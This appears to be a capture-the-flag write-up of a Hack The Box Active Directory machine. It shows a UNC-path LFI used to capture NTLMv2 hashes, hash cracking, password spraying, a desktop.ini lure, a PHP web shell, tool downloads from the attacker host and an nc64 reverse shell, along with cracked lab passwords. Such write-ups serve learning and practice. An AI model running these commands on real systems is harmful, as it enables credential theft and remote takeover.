
Target :

Date : 02/07/2026

```bash
>  echo "10.129.228.120 flight.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.228.120 flight.htb
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.228.120  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 10:20 +0200  
Nmap scan report for flight.htb (10.129.228.120)  
Host is up (0.051s latency).  
Not shown: 65517 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)  
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-title: g0 Aviation  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-02 15:20:58Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
9389/tcp  open  mc-nmf        .NET Message Framing  
49667/tcp open  msrpc         Microsoft Windows RPC  
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49674/tcp open  msrpc         Microsoft Windows RPC  
49686/tcp open  msrpc         Microsoft Windows RPC  
49694/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)  
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10  
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: 6h59m59s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2026-07-02T15:21:54  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 147.22 seconds
```

We got an Active Directory environment with `http 80/tcp`, `DNS 53/tcp`, `LDAP 389/tcp, kerberos 88/tcp, SMB 445/tcp, msrpc 135/tcp, netBIOS 139/tcp` and `636/tcp`.

The `http` indicates a web application or web server, when we type `http://flight.htb` we land on `http-title: g0 Aviation` which is a website for international travel.

We'll use fuzzing to find something because we don't have any `DC` hostname here.

We run a classic `vhost` scan :

```bash
>  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \  
    -u http://flight.htb \    
    -H "Host: FUZZ.flight.htb" \  
    -mc 200,301,302,403 -ac  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://flight.htb  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  
:: Header           : Host: FUZZ.flight.htb  
:: Follow redirects : false  
:: Calibration      : true  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,301,302,403  
________________________________________________  
  
school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 105ms]  
:: Progress: [5000/5000] :: Job [1/1] :: 131 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

And we find `school.flight.htb` which is an Aviation School website.

We can see the `.php?view=` argument in the url.

We'll use `responder` for `Local File Inclusion` and `curl` with our host `VPN IP` as the target to authenticate :

Terminal 1 :

```bash
>  sudo responder -I tun0 -v
```

Terminal 2 :

```bash
>  curl -s "http://school.flight.htb/index.php?view=//10.10.14.129/x"
```

Which makes the machine go talk to `\\10.10.14.129\`  (our IP address) while `Responder` is listening and access share `x`. It doesn't matter that share `x` doesn't exist because Windows sends `NTLM` to prove identity which our `Responder` catches :

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120  
[SMB] NTLMv2-SSP Username : flight\svc_apache  
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:8f7a378763b6b3f8:A96EDFF9A3D1E79F2385F454EBE07332:0101000000000000008D667E590ADD01EAD59A345937C3F300000000020008005900580037004E0001001E00570049004E002D0044005A005  
7003300510052003600450039005800460004003400570049004E002D0044005A005700330051005200360045003900580046002E005900580037004E002E004C004F00430041004C00030014005900580037004E002E004C004F00430041004C00050014005900580  
037004E002E004C004F00430041004C0007000800008D667E590ADD01060004000200000008003000300000000000000000000000003000002E92FE3A8ECFBFAC6C884F50DB3043619AA3ED7FC917A8B601F7B548FE4B39820A0010000000000000000000000000000  
00000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000
```

The target's SMB client identified and gave its `NTLM` through outbound `SMB` to our listener and revealed that it was `svc_apache` which is the service account for `Apache/PHP` on the domain as Windows tried to access the share behind our IP (x) and authenticated to do so.

We then crack the hash :

```bash
>  nano apache.hash  
>  john apache.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
  
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"  
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
S@Ss!K@*t13      (svc_apache)  
1g 0:00:00:09 DONE (2026-07-02 19:36) 0.1007g/s 1074Kp/s 1074Kc/s 1074KC/s SADSAF..Ryanec1  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed  
>  john apache.hash --show  
  
svc_apache:S@Ss!K@*t13:flight:8f7a378763b6b3f8:A96EDFF9A3D1E79F2385F454EBE07332:0101000000000000008D667E590ADD01EAD59A345937C3F300000000020008005900580037004E0001001E00570049004E002D0044005A00570033005100520036  
00450039005800460004003400570049004E002D0044005A005700330051005200360045003900580046002E005900580037004E002E004C004F00430041004C00030014005900580037004E002E004C004F00430041004C00050014005900580037004E002E004C00  
4F00430041004C0007000800008D667E590ADD01060004000200000008003000300000000000000000000000003000002E92FE3A8ECFBFAC6C884F50DB3043619AA3ED7FC917A8B601F7B548FE4B39820A001000000000000000000000000000000000000900220063  
006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000  
  
1 password hash cracked, 0 left
```

We got `flight:S@Ss!K@*t13`

```bash
>  smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'  
  
   ________  ___      ___  _______   ___      ___       __         _______  
  /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\  
 (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)  
  \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/  
   __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /  
  /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \  
 (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)  
-----------------------------------------------------------------------------  
SMBMap - Samba Share Enumerator v1.10.8 | Shawn Evans - ShawnDEvans@gmail.com  
                    https://github.com/ShawnDEvans/smbmap  
  
[*] Detected 1 hosts serving SMB  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                                                                                                            
                                                                                                                                                                                                              
[+] IP: 10.129.228.120:445      Name: flight.htb                Status: Authenticated  
       Disk                                                    Permissions     Comment  
       ----                                                    -----------     -------  
       ADMIN$                                                  NO ACCESS       Remote Admin  
       C$                                                      NO ACCESS       Default share  
       IPC$                                                    READ ONLY       Remote IPC  
       NETLOGON                                                READ ONLY       Logon server share    
       Shared                                                  READ ONLY  
       SYSVOL                                                  READ ONLY       Logon server share    
       Users                                                   READ ONLY  
       Web                                                     READ ONLY
```

We then use `Impacket` to look for users using `lookupsid` :

```bash
>  lookupsid.py 'flight.htb/svc_apache:S@Ss!K@*t13@flight.htb' 2>/dev/null  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Brute forcing SIDs at flight.htb  
[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]  
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209  
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)  
500: flight\Administrator (SidTypeUser)  
501: flight\Guest (SidTypeUser)  
502: flight\krbtgt (SidTypeUser)  
512: flight\Domain Admins (SidTypeGroup)  
513: flight\Domain Users (SidTypeGroup)  
514: flight\Domain Guests (SidTypeGroup)  
515: flight\Domain Computers (SidTypeGroup)  
516: flight\Domain Controllers (SidTypeGroup)  
517: flight\Cert Publishers (SidTypeAlias)  
518: flight\Schema Admins (SidTypeGroup)  
519: flight\Enterprise Admins (SidTypeGroup)  
520: flight\Group Policy Creator Owners (SidTypeGroup)  
521: flight\Read-only Domain Controllers (SidTypeGroup)  
522: flight\Cloneable Domain Controllers (SidTypeGroup)  
525: flight\Protected Users (SidTypeGroup)  
526: flight\Key Admins (SidTypeGroup)  
527: flight\Enterprise Key Admins (SidTypeGroup)  
553: flight\RAS and IAS Servers (SidTypeAlias)  
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)  
572: flight\Denied RODC Password Replication Group (SidTypeAlias)  
1000: flight\Access-Denied Assistance Users (SidTypeAlias)  
1001: flight\G0$ (SidTypeUser)  
1102: flight\DnsAdmins (SidTypeAlias)  
1103: flight\DnsUpdateProxy (SidTypeGroup)  
1602: flight\S.Moon (SidTypeUser)  
1603: flight\R.Cold (SidTypeUser)  
1604: flight\G.Lors (SidTypeUser)  
1605: flight\L.Kein (SidTypeUser)  
1606: flight\M.Gold (SidTypeUser)  
1607: flight\C.Bum (SidTypeUser)  
1608: flight\W.Walker (SidTypeUser)  
1609: flight\I.Francis (SidTypeUser)  
1610: flight\D.Truff (SidTypeUser)  
1611: flight\V.Stevens (SidTypeUser)  
1612: flight\svc_apache (SidTypeUser)  
1613: flight\O.Possum (SidTypeUser)  
1614: flight\WebDevs (SidTypeGroup)
```

We build a userslist out of the users here :

```bash
> nano /tmp/lookupsid.txt
>  grep '(SidTypeUser)' /tmp/lookupsid.txt | grep -i 'flight\\' | sed -E 's/.*[Ff][Ll][Ii][Gg][Hh][Tt]\\([^ ]+).*/\1/' | sort -u > /tmp/flight-users.txt  
  
>  cat /tmp/flight-users.txt  
Administrator  
C.Bum  
D.Truff  
G0$  
G.Lors  
Guest  
I.Francis  
krbtgt  
L.Kein  
M.Gold  
O.Possum  
R.Cold  
S.Moon  
svc_apache  
V.Stevens  
W.Walker
```

And then we spray with the `svc_apache` password :

```bash
>  nxc smb flight.htb -u /tmp/flight-users.txt -p 'S@Ss!K@*t13' --continue-on-success  
  
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\G0$:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13    
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13    
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE    
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

We got a positive on Sailor Moon `S.Moon` on `SMB`.

```bash
>  smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'  
  
  
   ________  ___      ___  _______   ___      ___       __         _______  
  /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\  
 (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)  
  \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/  
   __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /  
  /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \  
 (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)  
-----------------------------------------------------------------------------  
SMBMap - Samba Share Enumerator v1.10.8 | Shawn Evans - ShawnDEvans@gmail.com  
                    https://github.com/ShawnDEvans/smbmap  
  
[*] Detected 1 hosts serving SMB  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                                                                                                            
                                                                                                                                                                                                              
[+] IP: 10.129.228.120:445      Name: flight.htb                Status: Authenticated  
       Disk                                                    Permissions     Comment  
       ----                                                    -----------     -------  
       ADMIN$                                                  NO ACCESS       Remote Admin  
       C$                                                      NO ACCESS       Default share  
       IPC$                                                    READ ONLY       Remote IPC  
       NETLOGON                                                READ ONLY       Logon server share    
       Shared                                                  READ ONLY  
       SYSVOL                                                  READ ONLY       Logon server share    
       Users                                                   READ ONLY  
       Web                                                     READ ONLY  
[*] Closed 1 connections                                                                                                                                                                                       
>  nxc smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares  
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13    
SMB         10.129.228.120  445    G0               [*] Enumerated shares  
SMB         10.129.228.120  445    G0               Share           Permissions            Remark  
SMB         10.129.228.120  445    G0               -----           -----------            ------  
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin  
SMB         10.129.228.120  445    G0               C$                                     Default share  
SMB         10.129.228.120  445    G0               IPC$            READ                   Remote IPC  
SMB         10.129.228.120  445    G0               NETLOGON        READ                   Logon server share    
SMB         10.129.228.120  445    G0               Shared          READ,WRITE                
SMB         10.129.228.120  445    G0               SYSVOL          READ                   Logon server share    
SMB         10.129.228.120  445    G0               Users           READ                      
SMB         10.129.228.120  445    G0               Web             READ
```

We got two contradictory results here : `netexec` says `READ,WRITE` on `Shared` and `smbmap` says `READ ONLY`.

We created a lure `.ini` and put it inside `Shared`, and proved that `nxc`'s `WRITE` permission is effective :

```
>  smbclient.py 'flight.htb/S.Moon:S@Ss!K@*t13@flight.htb'  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
Type help for list of commands  
# use Shared
# put /tmp/ntlm_theft/htb/desktop.ini
# ls  
drw-rw-rw-          0  Fri Jul  3 03:15:22 2026 .  
drw-rw-rw-          0  Fri Jul  3 03:15:22 2026 ..  
-rw-rw-rw-         48  Fri Jul  3 03:15:22 2026 desktop.ini
```

The `desktop.ini` file pointed towards our `VPN IP` and a fake `Share` and created the same `outbound SMB authentication process` that we triggered previously, only the client changed : since we put it in a `SMB Share`, any curious domain user would click the .ini file thinking it's an innocent instructions file, and Windows tried to resolve `\\10.10.14.129\aa` which was referenced in the file's shell metadata.

And we got on our `responder` that was still running the `NTLM` :

```
[SMB] NTLMv2-SSP Client   : 10.129.228.120  
[SMB] NTLMv2-SSP Username : flight.htb\c.bum  
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:f42c0a0c04f3de65:28F0F58AB1D923C84079BE81CBAA4F65:0101000000000000008D667E590ADD011A058480E6E66B7200000000020008005900580037004E0001001E00570049004E002D0044005A0057  
003300510052003600450039005800460004003400570049004E002D0044005A005700330051005200360045003900580046002E005900580037004E002E004C004F00430041004C00030014005900580037004E002E004C004F00430041004C000500140059005800  
37004E002E004C004F00430041004C0007000800008D667E590ADD01060004000200000008003000300000000000000000000000003000002E92FE3A8ECFBFAC6C884F50DB3043619AA3ED7FC917A8B601F7B548FE4B39820A00100000000000000000000000000000  
0000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000
```

We copy and crack it with john again :

```bash
>  nano /tmp/cbum.hash  
  
>  john /tmp/cbum.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
  
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"  
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Tikkycoll_431012284 (c.bum)  
1g 0:00:00:14 DONE (2026-07-02 20:23) 0.06978g/s 735450p/s 735450c/s 735450C/s TinyMite1..Thehulk2008  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed  
>  john /tmp/cbum.hash --show  
  
c.bum:Tikkycoll_431012284:flight.htb:78a7370575bc31a6:198B835F04DD63D79982794FE36373BC:0101000000000000008D667E590ADD0182481B601EA4E62800000000020008005900580037004E0001001E00570049004E002D0044005A0057003300510  
052003600450039005800460004003400570049004E002D0044005A005700330051005200360045003900580046002E005900580037004E002E004C004F00430041004C00030014005900580037004E002E004C004F00430041004C00050014005900580037004E002  
E004C004F00430041004C0007000800008D667E590ADD01060004000200000008003000300000000000000000000000003000002E92FE3A8ECFBFAC6C884F50DB3043619AA3ED7FC917A8B601F7B548FE4B39820A00100000000000000000000000000000000000090  
0220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000  
  
1 password hash cracked, 0 left
```

`c.bum:Tikkycoll_431012284`

```bash
>  nxc smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares  
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284    
SMB         10.129.228.120  445    G0               [*] Enumerated shares  
SMB         10.129.228.120  445    G0               Share           Permissions            Remark  
SMB         10.129.228.120  445    G0               -----           -----------            ------  
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin  
SMB         10.129.228.120  445    G0               C$                                     Default share  
SMB         10.129.228.120  445    G0               IPC$            READ                   Remote IPC  
SMB         10.129.228.120  445    G0               NETLOGON        READ                   Logon server share    
SMB         10.129.228.120  445    G0               Shared          READ,WRITE                
SMB         10.129.228.120  445    G0               SYSVOL          READ                   Logon server share    
SMB         10.129.228.120  445    G0               Users           READ                      
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```

We have `READ` access on `Users` and `READ,WRITE` on `Web`.

```bash
>  smbclient //flight.htb/Users -U 'c.bum%Tikkycoll_431012284'  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                  DR        0  Thu Sep 22 22:16:56 2022  
 ..                                 DR        0  Thu Sep 22 22:16:56 2022  
 .NET v4.5                           D        0  Thu Sep 22 21:28:03 2022  
 .NET v4.5 Classic                   D        0  Thu Sep 22 21:28:02 2022  
 Administrator                       D        0  Mon Oct 31 19:34:00 2022  
 All Users                       DHSrn        0  Sat Sep 15 09:28:48 2018  
 C.Bum                               D        0  Thu Sep 22 22:08:23 2022  
 Default                           DHR        0  Tue Jul 20 21:20:24 2021  
 Default User                    DHSrn        0  Sat Sep 15 09:28:48 2018  
 desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018  
 Public                             DR        0  Tue Jul 20 21:23:25 2021  
 svc_apache                          D        0  Fri Oct 21 20:50:21 2022  
  
               5056511 blocks of size 4096. 1233078 blocks available  
smb: \> cd C.bum/Desktop  
smb: \C.bum\Desktop\> ls  
 .                                  DR        0  Thu Sep 22 22:17:02 2022  
 ..                                 DR        0  Thu Sep 22 22:17:02 2022  
 user.txt                           AR       34  Thu Jul  2 17:15:09 2026  
  
               5056511 blocks of size 4096. 1233078 blocks available  
smb: \C.bum\Desktop\> get user.txt  
getting file \C.bum\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \C.bum\Desktop\> quit  
>  cat user.txt  
2fa2b37deefaede818915e090118d50d
```

We got the user flag.

With our `Web` write we might be able to trigger a revshell through `.php` on the vhost. We create a basic `shell.php` and put it inside the `vhost` share.

```bash
>  name="s$(date +%s).php"; printf '<?php echo "<pre>"; system($_GET["c"]); echo "</pre>"; ?>' > "/tmp/$name"; smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284' -t 1200 -c "cd flight.htb; put /tmp/$name $name; ls $name; exit"

putting file /tmp/s1783019241.php as \flight.htb\s1783019241.php (0.4 kB/s) (average 0.4 kB/s)  
 s1783019241.php                     A       57  Fri Jul  3 04:07:23 2026  
  
               5056511 blocks of size 4096. 1231221 blocks available  

>  smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284'  
  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Jul  3 03:52:01 2026  
 ..                                  D        0  Fri Jul  3 03:52:01 2026  
 flight.htb                          D        0  Fri Jul  3 03:52:01 2026  
 school.flight.htb                   D        0  Fri Jul  3 03:52:01 2026  
  
               5056511 blocks of size 4096. 1232662 blocks available  
smb: \> cd school.flight.htb  
smb: \school.flight.htb\> put /tmp/shell.php shell.php  
putting file /tmp/shell.php as \school.flight.htb\shell.php (0.2 kB/s) (average 0.2 kB/s)  
smb: \school.flight.htb\> ls  
 .                                   D        0  Fri Jul  3 03:53:03 2026  
 ..                                  D        0  Fri Jul  3 03:53:03 2026  
 about.html                          A     1689  Tue Oct 25 05:54:45 2022  
 blog.html                           A     3618  Tue Oct 25 05:53:59 2022  
 home.html                           A     2683  Tue Oct 25 05:56:58 2022  
 images                              D        0  Fri Jul  3 03:52:01 2026  
 index.php                           A     2092  Thu Oct 27 09:59:25 2022  
 lfi.html                            A      179  Thu Oct 27 09:55:16 2022  
 shell.php                           A       57  Fri Jul  3 03:53:03 2026  
 styles                              D        0  Fri Jul  3 03:52:01 2026  
  
               5056511 blocks of size 4096. 1232662 blocks available  
smb: \school.flight.htb\> exit
```

We then go on our `Arsenal` directory :

```bash
>  cd ~/Arsenal/drop
>  ls *.exe  
accesschk64.exe  GodPotato-NET4.exe          KrbRelay.exe      mimikatz.exe  PrintSpoofer64.exe  Rubeus.exe      Seatbelt.exe     SharpDump.exe   SharpUp.exe   SweetPotato.exe  
Certify.exe      JuicyPotatoNG.exe           LaZagne.exe       nc64.exe      procdump64.exe      RunasCs.exe     SharpChrome.exe  SharpHound.exe  SharpWMI.exe  winPEASany.exe  
chisel.exe       kerbrute_windows_amd64.exe  ligolo-agent.exe  plink.exe     PsExec64.exe        SafetyKatz.exe  SharpDPAPI.exe   SharpRoast.exe  Snaffler.exe  winPEASx64.exe
```

We'll open a `python http server` here :

```bash
>  python3 -m http.server 9000 --directory ~/Arsenal/drop --bind 10.10.14.129  
  
Serving HTTP on 10.10.14.129 port 9000 (http://10.10.14.129:9000/) ...
```

And a listener :

```bash
>  rlwrap -cAr nc -lvnp 9001  
  
Listening on 0.0.0.0 9001
```

Then we'll trigger the download of the malicious `Arsenal` files using `s1783019241.php` as `$name` :

```bash
>  curl -G "http://flight.htb/$name" --data-urlencode 'c=powershell -c "iwr http://10.10.14.129:9000/RunasCs.exe -OutFile C:\Users\Public\Music\RunasCs.exe; iwr http://10.10.14.129:9000/nc64.exe -OutFile C:\Use  
rs\Public\Music\nc64.exe; iwr http://10.10.14.129:9000/SweetPotato.exe -OutFile C:\Users\Public\Music\SweetPotato.exe"'
```

Our `Arsenal` python http responded with `200 OK` to `GET` on every malware :

```
Serving HTTP on 10.10.14.129 port 9000 (http://10.10.14.129:9000/) ...  
10.129.228.120 - - [02/Jul/2026 21:08:15] "GET /RunasCs.exe HTTP/1.1" 200 -  
10.129.228.120 - - [02/Jul/2026 21:08:15] "GET /nc64.exe HTTP/1.1" 200 -  
10.129.228.120 - - [02/Jul/2026 21:08:15] "GET /SweetPotato.exe HTTP/1.1" 200 -
```

The `RunasCs` callback failed after that, indicating that our `shell.php` might've expired, so we chained both the creation of a new `shell.php` and the `RunasCs` callback to get a rev shell on our listener :

```bash
>  name="s$(date +%s).php"; printf '<?php echo "<pre>"; system($_GET["c"]); echo "</pre>"; ?>' > "/tmp/$name"; smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284' -t 1200 -c "cd flight.htb; put /tmp/$name  
$name; exit"; curl "http://flight.htb/$name?c=whoami"  
  
putting file /tmp/s1783019638.php as \flight.htb\s1783019638.php (0.2 kB/s) (average 0.2 kB/s)  
<pre>flight\svc_apache  
</pre>%                                                                                                                                                                                                             
>  curl -G "http://flight.htb/$name" --data-urlencode 'c=C:\Users\Public\Music\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\Users\Public\Music\nc64.exe -e cmd.exe 10.10.14.129 9001"
```

And it worked.

```PowerShell
>  rlwrap -cAr nc -lvnp 9001  
  
Listening on 0.0.0.0 9001  
Connection received on 10.129.228.120 58144  
Microsoft Windows [Version 10.0.17763.2989]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>whoami  
whoami  
flight\c.bum

C:\Windows\system32>whoami /groups  
  
whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID                                            Attributes                                           
========================================== ================ ============================================== ==================================================  
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                             
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group  
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group  
flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                         
  
C:\Windows\system32>  
C:\Windows\system32>powershell -c "Get-NetTCPConnection -State Listen | ? LocalPort -eq 8000"  
  
powershell -c "Get-NetTCPConnection -State Listen | ? LocalPort -eq 8000"  
  
LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting  
------------                        --------- -------------                       ---------- -----       --------------  
::                                  8000      ::                                  0          Listen
```

We use `shell.aspx`, a `web-script` shell wrapper and push it to `inetpub\development` on c.bum's shell.

Response from our `python http server` :

`10.129.228.120 - - [02/Jul/2026 21:27:02] "GET /shell.aspx HTTP/1.1" 200 -`

```PowerShell
Directory of C:\inetpub\development  
  
07/02/2026  07:27 PM               370 shell.aspx  
              1 File(s)            370 bytes  
              0 Dir(s)   5,040,947,200 bytes free
```

Then, we execute the shell.aspx with `whoami` :

```bash
C:\Windows\system32>powershell -c "iwr 'http://127.0.0.1:8000/shell.aspx?c=whoami' -UseBasicParsing"  
  
powershell -c "iwr 'http://127.0.0.1:8000/shell.aspx?c=whoami' -UseBasicParsing"  
  
  
StatusCode        : 200  
StatusDescription : OK  
Content           :    
                   <pre>iis apppool\defaultapppool  
                   </pre>  
                      
RawContent        : HTTP/1.1 200 OK  
                   Content-Length: 41  
                   Cache-Control: private  
                   Content-Type: text/html; charset=utf-8  
                   Date: Fri, 03 Jul 2026 02:28:31 GMT  
                   Server: Microsoft-IIS/10.0  
                   X-AspNet-Version: 4.0.30319  
                   X-Pow...  
Forms             :    
